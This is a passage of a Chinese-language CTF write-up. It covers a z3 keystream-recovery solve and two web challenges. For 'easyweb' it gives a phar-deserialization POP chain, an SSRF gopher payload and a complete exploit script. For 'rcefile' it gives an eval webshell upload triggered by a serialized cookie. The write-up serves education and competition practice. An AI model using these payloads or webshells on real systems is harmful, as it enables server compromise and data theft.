<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Check1</span>(<span class="params">x, y, z, KeyStream</span>):</span></span><br><span class="line">    num = -<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">320</span>):</span><br><span class="line">        x = (((x &gt;&gt; <span class="number">29</span> ^ x &gt;&gt; <span class="number">28</span> ^ x &gt;&gt; <span class="number">25</span> ^ x &gt;&gt; <span class="number">23</span>) &amp; <span class="number">1</span>) | x &lt;&lt; <span class="number">1</span>)</span><br><span class="line">        y = (((y &gt;&gt; <span class="number">30</span> ^ y &gt;&gt; <span class="number">27</span>) &amp; <span class="number">1</span>) | y &lt;&lt; <span class="number">1</span>)</span><br><span class="line">        z = (((z &gt;&gt; <span class="number">31</span> ^ z &gt;&gt; <span class="number">30</span> ^ z &gt;&gt; <span class="number">29</span> ^ z &gt;&gt; <span class="number">28</span> ^ z &gt;&gt; <span class="number">26</span> ^ z &gt;&gt; <span class="number">24</span>) &amp; <span class="number">1</span>) | z &lt;&lt; <span class="number">1</span>)</span><br><span class="line">        flag = i % <span class="number">8</span></span><br><span class="line">        <span class="keyword">if</span> (flag == <span class="number">0</span>):</span><br><span class="line">            num += <span class="number">1</span></span><br><span class="line">        KeyStream[num] = (KeyStream[num] &lt;&lt; <span class="number">1</span>) | ((z &gt;&gt; <span class="number">32</span> &amp; <span class="number">1</span> &amp; (x &gt;&gt; <span class="number">30</span> &amp; <span class="number">1</span>)) ^ (((z &gt;&gt; <span class="number">32</span> &amp; <span class="number">1</span>) ^ <span class="number">1</span>) &amp; (y &gt;&gt; <span class="number">31</span> &amp; <span class="number">1</span>)))</span><br><span class="line">    <span class="keyword">return</span> KeyStream</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ParseKey</span>(<span class="params">L, Key</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            Key[i * <span class="number">4</span> + j] = L[i] &gt;&gt; j * <span class="number">8</span> &amp; <span class="number">255</span></span><br><span class="line">    <span class="keyword">return</span> Key</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">s = Solver()</span><br><span class="line">first = [<span class="number">101</span>, <span class="number">5</span>, <span class="number">80</span>, <span class="number">213</span>, <span class="number">163</span>, <span class="number">26</span>, <span class="number">59</span>, <span class="number">38</span>, <span class="number">19</span>, <span class="number">6</span>, <span class="number">173</span>, <span class="number">189</span>, <span class="number">198</span>, <span class="number">166</span>, <span class="number">140</span>, <span class="number">183</span>, <span class="number">42</span>, <span class="number">247</span>, <span class="number">223</span>, <span class="number">24</span>, <span class="number">106</span>, <span class="number">20</span>, <span class="number">145</span>, <span class="number">37</span>, <span class="number">24</span>,</span><br><span class="line">         <span class="number">7</span>, <span class="number">22</span>, <span class="number">191</span>, <span class="number">110</span>, <span class="number">179</span>, <span class="number">227</span>, <span class="number">5</span>, <span class="number">62</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">65</span>, <span class="number">22</span>, <span class="number">37</span>, <span class="number">5</span>]</span><br><span class="line">KeyStream = [<span class="number">0</span>] * <span class="built_in">len</span>(first)</span><br><span class="line"></span><br><span class="line">x, y, z=BitVecs(<span class="string">&#x27;x y z&#x27;</span>, <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">num = -<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">320</span>):</span><br><span class="line">    x = (((x &gt;&gt; <span class="number">29</span> ^ x &gt;&gt; <span class="number">28</span> ^ x &gt;&gt; <span class="number">25</span> ^ x &gt;&gt; <span class="number">23</span>) &amp; <span class="number">1</span>) | x &lt;&lt; <span class="number">1</span>)</span><br><span class="line">    y = (((y &gt;&gt; <span class="number">30</span> ^ y &gt;&gt; <span class="number">27</span>) &amp; <span class="number">1</span>) | y &lt;&lt; <span class="number">1</span>)</span><br><span class="line">    z = (((z &gt;&gt; <span class="number">31</span> ^ z &gt;&gt; <span class="number">30</span> ^ z &gt;&gt; <span class="number">29</span> ^ z &gt;&gt; <span class="number">28</span> ^ z &gt;&gt; <span class="number">26</span> ^ z &gt;&gt; <span class="number">24</span>) &amp; <span class="number">1</span>) | z &lt;&lt; <span class="number">1</span>)</span><br><span class="line">    flag = i % <span class="number">8</span> == <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        num+=<span class="number">1</span></span><br><span class="line">    KeyStream[num] = ((KeyStream[num] &lt;&lt; <span class="number">1</span>) | ((((z &gt;&gt; <span class="number">32</span> &amp; <span class="number">1</span> &amp; (x &gt;&gt; <span class="number">30</span> &amp; <span class="number">1</span>)) ^ (((z &gt;&gt; <span class="number">32</span> &amp; <span class="number">1</span>) ^ <span class="number">1</span>) &amp; (y &gt;&gt; <span class="number">31</span> &amp; <span class="number">1</span>))))))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    s.add(first[i]==KeyStream[i])</span><br><span class="line"></span><br><span class="line">s.check()</span><br><span class="line"><span class="built_in">print</span>(s.model())</span><br><span class="line"><span class="comment"># [y = 868387187, x = 156324965, z = 3131229747]</span></span><br><span class="line">y = <span class="number">868387187</span></span><br><span class="line">x = <span class="number">156324965</span></span><br><span class="line">z = <span class="number">3131229747</span></span><br><span class="line">array = [x, y, z]</span><br><span class="line">array2 = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">array4 = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">array5 = [<span class="number">60</span>, <span class="number">100</span>, <span class="number">36</span>, <span class="number">86</span>, <span class="number">51</span>, <span class="number">251</span>, <span class="number">167</span>, <span class="number">108</span>, <span class="number">116</span>, <span class="number">245</span>, <span class="number">207</span>, <span class="number">223</span>, <span class="number">40</span>, <span class="number">103</span>, <span class="number">34</span>, <span class="number">62</span>, <span class="number">22</span>, <span class="number">251</span>, <span class="number">227</span>]</span><br><span class="line">array2 = Check1(array[<span class="number">0</span>], array[<span class="number">1</span>], array[<span class="number">2</span>], array2)</span><br><span class="line">array4 = ParseKey(array, array4)</span><br><span class="line"><span class="built_in">print</span>(array4)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(array5)):</span><br><span class="line">    array5[i] ^= array4[i % <span class="built_in">len</span>(array4)]</span><br><span class="line">    array5[i] = <span class="built_in">chr</span>(array5[i])</span><br><span class="line"><span class="built_in">print</span>(array5)</span><br><span class="line">flag = <span class="string">&#x27;flag&#123;&#x27;</span> + <span class="string">&#x27;&#x27;</span>.join(array5) + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#flag&#123;Y0u_@re_G3meM3s7er!&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h4><p>ctrl+u 发现存在showfile.php任意文件读取</p>
<p><img src="https://img-blog.csdnimg.cn/02f00044045e4660845997c457b8c1b0.png" alt="image-20220801140119319"></p>
<p>不过读取的文件名中必须要有demo或者guest，很简单就能绕过。直接读到了<code>class.php index.php showfile.php upload.php</code></p>
<p>简单看一下，可以发现重点是在<code>class.php</code>，不过在此之前还有一个点，因为所有文件中并没有实现自动打开session，而在showfile.php和upload.php文件中都有限制，必须session存在才能进行文件上传等，就不多说了，可以利用<code>PHP_SESSION_UPLOAD_PROGRESS</code>绕过</p>
<p><code>class.php</code></p>
<p>共有三个类，分别为Upload用于文件上传，GuestShow和AdminShow为在showfile.php中用到，而AdminShow中很明显存在SSRF。而既然有类，当然就会想进行反序列化了，而又存在任意文件读取，就会想到利用<code>phar://</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$url</span> = <span class="keyword">$this</span>-&gt;schema . <span class="keyword">$this</span>-&gt;source;</span><br><span class="line"><span class="variable">$curl</span> = curl_init();</span><br><span class="line">curl_setopt(<span class="variable">$curl</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">curl_setopt(<span class="variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">curl_setopt(<span class="variable">$curl</span>, CURLOPT_HEADER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$response</span> = curl_exec(<span class="variable">$curl</span>);</span><br><span class="line">curl_close(<span class="variable">$curl</span>);</span><br><span class="line"><span class="variable">$src</span> = <span class="string">&quot;data:jpg;base64,&quot;</span>.base64_encode(<span class="variable">$response</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;img src=<span class="subst">&#123;$src&#125;</span> /&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>那么来找一下链子吧。首先我们最后想要实现的肯定就是<code>AdminShow#show</code>方法的SSRF，那么可以先找一下有哪个链子能到</p>
<p>这里就直接贴了：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GuestShow#__destruct</span><br><span class="line">	GuestShow#__toString</span><br><span class="line">		AdminShow#__get</span><br><span class="line">			AdminShow#show</span><br></pre></td></tr></table></figure>

<p>但是我们可以发现AdminShow类中存在__wakeup给<code>$this-&gt;schema</code>和<code>$this-&gt;source</code>赋值，那么就得重新找一下链子绕过了，这里也不多说，直接贴上吧</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Upload</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filesize</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$date</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tmp</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GuestShow</span></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminShow</span></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$schema</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">new</span> AdminShow();</span><br><span class="line"><span class="variable">$guest</span> = <span class="keyword">new</span> GuestShow();</span><br><span class="line"><span class="variable">$guest1</span> = <span class="keyword">new</span> GuestShow();</span><br><span class="line"><span class="variable">$upload</span> = <span class="keyword">new</span> Upload();</span><br><span class="line"><span class="variable">$upload1</span> = <span class="keyword">new</span> Upload();</span><br><span class="line"><span class="variable">$upload2</span> = <span class="keyword">new</span> Upload();</span><br><span class="line"><span class="variable">$guest</span>-&gt;file = <span class="variable">$upload</span>;</span><br><span class="line"><span class="variable">$upload</span>-&gt;tmp = <span class="variable">$show</span>;</span><br><span class="line"><span class="variable">$show</span>-&gt;str[<span class="number">0</span>] = <span class="variable">$upload1</span>;</span><br><span class="line"><span class="variable">$upload1</span>-&gt;date=<span class="string">&#x27;&#x27;</span>; <span class="comment">// 给source赋值</span></span><br><span class="line"><span class="variable">$upload1</span>-&gt;filesize = <span class="variable">$show</span>;</span><br><span class="line"><span class="variable">$upload2</span>-&gt;filesize = <span class="variable">$show</span>;</span><br><span class="line"><span class="variable">$upload2</span>-&gt;tmp = <span class="variable">$guest1</span>;</span><br><span class="line"><span class="variable">$show</span>-&gt;str[<span class="number">1</span>] = <span class="variable">$upload2</span>;</span><br><span class="line"><span class="variable">$upload2</span>-&gt;date = <span class="string">&#x27;&#x27;</span>; <span class="comment">// 给schema赋值</span></span><br><span class="line"><span class="variable">$guest1</span>-&gt;file = <span class="variable">$show</span>;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;test.phar&quot;</span>); <span class="comment">//.phar文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&#x27;GIF89a&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>); <span class="comment">//固定的</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$guest</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//随便写点什么生成个签名</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line">rename(<span class="string">&#x27;test.phar&#x27;</span>,<span class="string">&#x27;f.jpg&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>然后把文件上传，并通过showfie.php进行phar://协议触发反序列化，最先我们可以先读取<code>/etc/hosts</code>发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">172.18.0.2	3b35825919ae</span><br><span class="line">10.10.10.5	3b35825919ae</span><br></pre></td></tr></table></figure>

<p>那么先可以利用http协议查看那个ip存在可利用信息，最终发现在<code>10.10.10.10</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//内网资源阅读器-测试机</span></span><br><span class="line"><span class="comment">//配置信息请看phpinfo.php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$link</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="variable">$curlobj</span> = curl_init();</span><br><span class="line">    curl_setopt(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$result</span>=curl_exec(<span class="variable">$curlobj</span>);</span><br><span class="line">    curl_close(<span class="variable">$curlobj</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]===<span class="string">&#x27;10.10.10.101&#x27;</span>||<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]===<span class="string">&#x27;100.100.100.101&#x27;</span>)&#123;</span><br><span class="line">    system(<span class="string">&#x27;cat /flag&#x27;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>最后利用gopher进行GET利用url file协议读取flag就好了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">payload = \</span><br><span class="line"><span class="string">&quot;&quot;&quot;GET /?url=file:///flag HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 10.10.10.101</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">tmp = urllib.parse.quote(payload)</span><br><span class="line">new = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>, <span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;gopher://10.10.10.10:80/&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+new</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>最终exp：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def edit(filename):</span><br><span class="line">    with open(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        a = base64.b64encode(f.read())</span><br><span class="line">    c = base64.b64encode(base64.b64decode(a).replace(<span class="string">b&quot;10.10.10.5&quot;</span>, <span class="string">b&quot;10.10.10.6&quot;</span>))</span><br><span class="line">    with open(<span class="string">&#x27;e.jpg&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> w:</span><br><span class="line">        w.write(base64.b64decode(c))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def upload():</span><br><span class="line">    url = <span class="string">&#x27;http://47.104.95.124:8080/upload.php&#x27;</span></span><br><span class="line">    <span class="comment"># url = &#x27;http://127.0.0.1:40012/upload.php&#x27;</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;123456789&#x27;</span>&#125;</span><br><span class="line">    files = &#123;<span class="string">&#x27;file&#x27;</span>: open(<span class="string">&#x27;f.jpg&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)&#125;</span><br><span class="line">    r = requests.post(url, files=files, data=data, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;test2&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def phar(payload):</span><br><span class="line">    <span class="comment"># url = &#x27;http://47.104.95.124:8080/showfile.php?f=&#x27;</span></span><br><span class="line">    url = <span class="string">&#x27;http://47.104.95.124:8080/showfile.php?f=php://filter/guest/resource=phar:///var/www/html/&#x27;</span></span><br><span class="line">    <span class="comment"># url = &#x27;http://127.0.0.1:40012/showfile.php?f=php://filter/guest/resource=phar://&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(upload())</span></span><br><span class="line">    <span class="comment"># payload = &#x27;phar:///var/www/html/&#x27; + upload()</span></span><br><span class="line">    <span class="comment"># data = &#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;111111111&#x27;&#125;</span></span><br><span class="line">    <span class="comment"># files = &#123;&#x27;file&#x27;: &#x27;123&#x27;&#125;</span></span><br><span class="line">    r = requests.get(url + payload)</span><br><span class="line">    <span class="keyword">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getFileByGuestShow():</span><br><span class="line">    <span class="keyword">global</span> content</span><br><span class="line">    filename = [<span class="string">&#x27;index.php&#x27;</span>, <span class="string">&#x27;showfile.php&#x27;</span>, <span class="string">&#x27;class.php&#x27;</span>, <span class="string">&#x27;upload.php&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> file in filename:</span><br><span class="line">        url = <span class="string">&#x27;http://47.104.95.124:8080/showfile.php?f=demo/../&#x27;</span> + file</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        <span class="keyword">print</span>(r.text)</span><br><span class="line">        zz = re.compile(<span class="string">&#x27;&lt;img src=data:jpg;base64,[a-zA-Z0-9\\\+/=]&#123;1,&#125;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> zz.findall(r.text):</span><br><span class="line">            content = zz.findall(r.text)[<span class="number">0</span>][<span class="number">25</span>:]</span><br><span class="line">            <span class="keyword">print</span>(content)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            with open(file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> w:</span><br><span class="line">                base = base64.b64decode(content)</span><br><span class="line">                <span class="keyword">print</span>(base)</span><br><span class="line">                w.write(base)</span><br><span class="line">        except:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getFileByAdminShow():</span><br><span class="line">    url = <span class="string">&#x27;http://47.104.95.124:8080/showfile.php?f=&#x27;</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;111111111&#x27;</span>&#125;</span><br><span class="line">    payload = <span class="string">&#x27;../../../../etc/hosts&#x27;</span></span><br><span class="line">    files = &#123;<span class="string">&#x27;file&#x27;</span>: <span class="string">&#x27;123&#x27;</span>&#125;</span><br><span class="line">    r = requests.post(url + payload, files=files, data=data, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;test123456&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># edit(&#x27;e.jpg&#x27;)</span></span><br><span class="line">    upload()</span><br><span class="line">    <span class="comment"># getFileByGuestShow()  # 获取文件内容</span></span><br><span class="line">    phar(<span class="string">&#x27;16029c2703ba2ab39d897f966a28f95c/f.jpg&#x27;</span>)  <span class="comment"># 上传文件并执行phar</span></span><br><span class="line">    <span class="comment"># getFileByAdminShow()</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/2e340a68ab1b444fbacace5443fec797.png" alt="QQ图片20220801142401"></p>
<p>flag:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;easy_penetration_it_is_!_QAQ&#125;</span><br></pre></td></tr></table></figure>

<h3 id="强网先锋"><a href="#强网先锋" class="headerlink" title="强网先锋"></a>强网先锋</h3><h4 id="rcefile"><a href="#rcefile" class="headerlink" title="rcefile"></a>rcefile</h4><p>存在<code>www.zip</code>泄露</p>
<p>upload.php中存在黑名单，并且尝试上传phps等后缀的时候发现并没有被解析，但是可以上传inc文件</p>
<p>并且可以发现文件名会被放到<code>$userfile</code>数组中并将数组序列化放到cookie中，当然在一开始做题测试的时候应该也能从页面中看到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.inc.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$file</span>[<span class="string">&quot;error&quot;</span>] == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">102400</span>) &#123;</span><br><span class="line">        <span class="variable">$typeArr</span> = explode(<span class="string">&quot;/&quot;</span>, <span class="variable">$file</span>[<span class="string">&quot;type&quot;</span>]);</span><br><span class="line">        <span class="variable">$imgType</span> = <span class="keyword">array</span>(<span class="string">&quot;png&quot;</span>,<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;jpeg&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$typeArr</span>[<span class="number">0</span>]== <span class="string">&quot;image&quot;</span> | !in_array(<span class="variable">$typeArr</span>[<span class="number">1</span>], <span class="variable">$imgType</span>))&#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&quot;type error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$blackext</span> = [<span class="string">&quot;php&quot;</span>, <span class="string">&quot;php5&quot;</span>, <span class="string">&quot;php3&quot;</span>, <span class="string">&quot;html&quot;</span>, <span class="string">&quot;swf&quot;</span>, <span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>];</span><br><span class="line">        <span class="variable">$filearray</span> = pathinfo(<span class="variable">$file</span>[<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">        <span class="variable">$ext</span> = <span class="variable">$filearray</span>[<span class="string">&quot;extension&quot;</span>];</span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="variable">$ext</span>, <span class="variable">$blackext</span>)) &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&quot;extension error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$imgname</span> = md5(time()).<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;./&quot;</span>.<span class="variable">$imgname</span>)) &#123;</span><br><span class="line">            array_push(<span class="variable">$userfile</span>, <span class="variable">$imgname</span>);</span><br><span class="line">            setcookie(<span class="string">&quot;userfile&quot;</span>, serialize(<span class="variable">$userfile</span>), time() + <span class="number">3600</span>*<span class="number">10</span>);</span><br><span class="line">            <span class="variable">$msg</span> = e(<span class="string">&quot;file: <span class="subst">&#123;$imgname&#125;</span>&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$msg</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;upload failed!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在class.inc.php中可以发现，而它不仅可以解析php文件还可以解析inc文件</p>
<p>而这里也直接对cookie进行反序列化，没有任何过滤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">spl_autoload_register();</span><br><span class="line"><span class="variable">$userfile</span> = <span class="keyword">empty</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;userfile&quot;</span>]) ? [] : unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&quot;userfile&quot;</span>]);</span><br></pre></td></tr></table></figure>

<p>那么直接上传一个inc文件，注意要将文件的Content-type修改一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&#x27;ls&#x27;);eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/b5891132765242fd9daff83805a9f76e.png" alt="image-20220801135545948"></p>
<p>获得文件名，将cookie修改成：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A32%3A%2202f9bf508f93eebdd216dba17c5a99c0%22%3A0%3A%7B%7D</span><br></pre></td></tr></table></figure>

<p>刷新一下，执行成功</p>
<p><img src="https://img-blog.csdnimg.cn/dd15e841bf46482c88ec479bf68a682c.png" alt="image-20220801140011233"></p>
<p>flag：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;3acd895a-8b80-4fd7-8cc9-2701f261d654&#125;</span><br></pre></td></tr></table></figure>

<h4 id="polydiv"><a href="#polydiv" class="headerlink" title="polydiv"></a>polydiv</h4><ul>
<li><p>题目描述</p>
